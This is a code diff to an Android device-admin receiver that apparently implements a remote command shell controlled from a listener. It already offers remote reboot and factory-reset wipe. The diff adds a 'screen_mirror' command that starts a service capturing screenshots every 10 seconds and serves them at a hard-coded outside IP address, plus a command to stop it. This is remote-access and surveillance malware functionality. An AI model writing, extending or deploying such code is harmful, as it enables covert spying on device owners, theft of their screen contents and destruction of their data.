@@ -67,6 +67,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  reboot (not working on emulator)     - Reboot device");
                 writer.println("  exit        - Close connection");
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
+                writer.println("  screen_mirror - Start sending screenshots every 10s");
+                writer.println("  screen_stop   - Stop screen mirror");
                 writer.println("----------------------------------");
 
                 // Read commands from listener
@@ -140,9 +142,20 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             case "exit":
                 return "👋 Closing connection...";
 
-                case "wipe":
+            case "wipe":
                 wipeDevice(context);
                 return "✅ Wiping device...";
+
+            case "screen_mirror":
+                Intent mirrorIntent = new Intent(context, ScreenMirrorService.class);
+                mirrorIntent.putExtra("resultCode", ScreenMirrorService.sResultCode);
+                mirrorIntent.putExtra("resultData", ScreenMirrorService.sResultData);
+                context.startForegroundService(mirrorIntent);
+                return "🎥 Screen mirror started! View at http://20.2.66.175:9090";
+
+            case "screen_stop":
+                context.stopService(new Intent(context, ScreenMirrorService.class));
+                return "🛑 Screen mirror stopped!";
 
             default:
                 return "❌ Unknown command: " + command + " | type 'help' for commands";
